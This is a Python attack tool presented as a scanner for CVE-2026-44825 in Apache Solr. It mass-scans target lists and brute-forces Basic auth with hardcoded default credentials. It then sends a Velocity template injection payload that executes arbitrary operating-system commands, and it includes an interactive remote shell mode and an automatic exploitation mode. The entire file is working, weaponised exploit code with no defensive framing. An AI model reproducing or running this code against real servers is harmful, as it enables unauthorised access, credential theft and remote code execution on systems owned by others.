#!/usr/bin/env python3
import requests, sys, json, re, base64, argparse, time
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
import urllib3
urllib3.disable_warnings()

TIMEOUT = 8
THREADS = 30
TEMPLATE_USERS = ['superadmin', 'admin', 'search', 'index']
PASSWORD_LIST = ['SolrRocks', 'solr', 'Solr123', 'admin', 'password', 'changeme', 'secret', 'solradmin']
VERSION_RE = [r'solr-spec-version[^0-9]*([\d.]+)', r'solr-impl-version[^0-9]*([\d.]+)']

lock = Lock()
scanned, solr_found, vuln_found = 0, 0, 0

def norm(url):
    url = url.strip()
    if not url.startswith('http'): url = 'http://' + url
    if '/solr' not in url: url = url.rstrip('/') + '/solr'
    return url

def req(url, path='/admin/info/system', hdrs=None):
    try: return requests.get(url + path, headers=hdrs, verify=False, timeout=TIMEOUT)
    except: return None

def detect(url):
    r = req(url)
    if r is not None and r.status_code in [200, 401]:
        t = (r.text or '')[:5000]
        if 'solr' in t.lower() or 'solr' in r.headers.get('Server', '').lower():
            v = None
            for p in VERSION_RE:
                m = re.search(p, t, re.I)
                if m: v = m.group(1); break
            # check auth on protected endpoints too (info/system may be open while cores/collections require auth)
            auth = (r.status_code == 401)
            if not auth:
                r2 = req(url, '/admin/cores?action=STATUS')
                if r2 is not None and r2.status_code == 401:
                    auth = True
                else:
                    r3 = req(url, '/admin/collections?action=LIST')
                    if r3 is not None and r3.status_code == 401:
                        auth = True
            return True, v, auth
    return False, None, False

def is_vuln(ver):
    if not ver: return None
    try:
        x = [int(i) for i in ver.split('.')]
        if x[0] == 9 and 4 <= x[1] <= 10: return not (x[1] == 10 and len(x) > 2 and x[2] > 1)
        if x[0] == 10: return x[1] == 0 and (len(x) < 3 or x[2] == 0)
    except: return None
    return False

def try_auth(url, u, p):
    a = base64.b64encode((u + ':' + p).encode()).decode()
    r = req(url, hdrs={'Authorization': 'Basic ' + a})
    return r is not None and r.status_code == 200

def get_cols(url, u, p):
    hdrs = {}
    if u and p:
        a = base64.b64encode((u + ':' + p).encode()).decode()
        hdrs = {'Authorization': 'Basic ' + a}
    r = req(url, '/admin/collections?action=LIST', hdrs=hdrs)
    if r is not None and r.status_code == 200:
        try:
            cols = r.json().get('collections', [])
            if cols: return cols
        except: pass
    # fallback: standalone Solr uses /admin/cores
    r = req(url, '/admin/cores?action=STATUS', hdrs=hdrs)
    if r is not None and r.status_code == 200:
        try:
            cores = list(r.json().get('status', {}).keys())
            if cores: return cores
        except: pass
    return []

def rce(url, u, p, cmd='id'):
    c = get_cols(url, u, p) or ['gettingstarted', 'test']
    h = {'Content-Type': 'application/x-www-form-urlencoded'}
    if u and p:
        a = base64.b64encode((u + ':' + p).encode()).decode()
        h['Authorization'] = 'Basic ' + a
    pl = 'q=1&wt=velocity&v.template=custom&v.template.custom=%23set(%24x=%27%27)%23set(%24rt=%24x.class.forName(%27java.lang.Runtime%27))%23set(%24chr=%24x.class.forName(%27java.lang.Character%27))%23set(%24ex=%24rt.getRuntime().exec(%27' + cmd + '%27))%24ex.waitFor()%25%23set(%24out=%24ex.getInputStream())%23foreach(%24i%20in%20[1..%24out.available()])%24str.valueOf(%24chr.toChars(%24out.read()))%23end'
    try:
        r = requests.post(url + '/' + c[0] + '/select', headers=h, data=pl.encode(), verify=False, timeout=TIMEOUT)
        if r is not None and r.status_code == 200 and r.text.strip():
            return r.text.strip()
    except: pass
    return None

def scan(url):
    global scanned, solr_found, vuln_found
    url = norm(url)
    ok, ver, auth = detect(url)
    
    with lock:
        scanned += 1
        s = scanned
    
    if not ok:
        if s % 100 == 0:
            with lock:
                print('[%d] scanning... Solr:%d Vuln:%d' % (s, solr_found, vuln_found))
        return {'url': url, 'found': False}
    
    with lock:
        solr_found += 1
        vuln = is_vuln(ver)
        if vuln: vuln_found += 1
        tag = ' VULN' if vuln else ''
        tag2 = ' +Auth' if auth else ''
        info = '[Solr %s]%s%s %s' % ((ver or '?'), tag, tag2, url)
        print(info)

    result = {'url': url, 'found': True, 'version': ver, 'vulnerable': vuln, 'auth': auth, 'creds': [], 'cols': []}

    # try unauthenticated collection listing first
    if not auth:
        result['cols'] = get_cols(url, '', '')
        if result['cols']:
            print('    Cols (no auth): ' + str(result['cols'][:5]))

    if auth:
        for user in TEMPLATE_USERS:
            for pw in PASSWORD_LIST:
                if try_auth(url, user, pw):
                    print('    [!] ' + user + ':' + pw)
                    result['creds'].append([user, pw])
                    result['cols'] = get_cols(url, user, pw)
                    if result['cols']:
                        print('    Cols: ' + str(result['cols'][:5]))
                    break
    
    return result

def mass(targets, exploit=False, outfile='results.json'):
    global THREADS
    print('Targets: %d | Threads: %d | Timeout: %ds' % (len(targets), THREADS, TIMEOUT))
    print('Scanning...')
    print()
    
    results = []
    with ThreadPoolExecutor(THREADS) as e:
        fs = {e.submit(scan, t): t for t in targets}
        for f in as_completed(fs):
            results.append(f.result())
    
    print()
    print('Done. Total:%d | Solr:%d | Vuln:%d' % (len(results), solr_found, vuln_found))
    
    vulns = [r for r in results if r.get('creds')]
    if vulns:
        print()
        print('[VULNERABLE]')
        for r in vulns:
            for u, p in r['creds']:
                print('  %s -> %s:%s (v%s)' % (r['url'], u, p, str(r.get('version', '?'))))
    else:
        print()
        print('No vulnerable targets found.')
    
    if exploit and vulns:
        print()
        print('[Exploiting]')
        for r in vulns:
            u, p = r['creds'][0]
            o = rce(r['url'], u, p, 'id; hostname; whoami')
            if o:
                print('RCE: %s' % r['url'])
                print(o)
                print()
    
    if outfile and vulns:
        json.dump(vulns, open(outfile, 'w'), indent=2)
        print('Saved: ' + outfile)
    
    return results

def main():
    global THREADS, TIMEOUT
    p = argparse.ArgumentParser(description='CVE-2026-44825 Apache Solr Scanner')
    p.add_argument('-t', '--target')
    p.add_argument('-f', '--file')
    p.add_argument('--exploit', action='store_true')
    p.add_argument('--rce', action='store_true')
    p.add_argument('-u', '--user')
    p.add_argument('-pw', '--password')
    p.add_argument('-o', '--output', default='solr_results.json')
    p.add_argument('-w', '--workers', type=int, default=THREADS)
    p.add_argument('-T', '--timeout', type=int, default=TIMEOUT)
    a = p.parse_args()
    
    THREADS = a.workers
    TIMEOUT = a.timeout
    
    print('CVE-2026-44825 Apache Solr Scanner')
    print()
    
    if a.rce and a.target:
        url = norm(a.target)
        u, pw = a.user, a.password
        if not u:
            for xu in TEMPLATE_USERS:
                for xp in PASSWORD_LIST:
                    if try_auth(url, xu, xp):
                        u, pw = xu, xp
                        print('[+] ' + u + ':' + pw)
                        break
                if u: break
        if u:
            while True:
                c = input('solr$ ').strip()
                if c in ['exit', 'quit']: break
                if c:
                    o = rce(url, u, pw, c)
                    if o: print(o)
        else:
            print('[-] No credentials found')
        return
    
    if a.target and not a.file:
        r = scan(a.target)
        if a.exploit and r.get('creds'):
            u, p = r['creds'][0]
            o = rce(r['url'], u, p, 'id; hostname; uname -a')
            if o: print('RCE:'); print(o)
        return
    
    if a.file:
        with open(a.file) as f:
            targets = [l.strip() for l in f if l.strip() and not l.startswith('#')]
        mass(targets, a.exploit, a.output)
        return
    
    p.print_help()

if __name__ == '__main__':
    main()
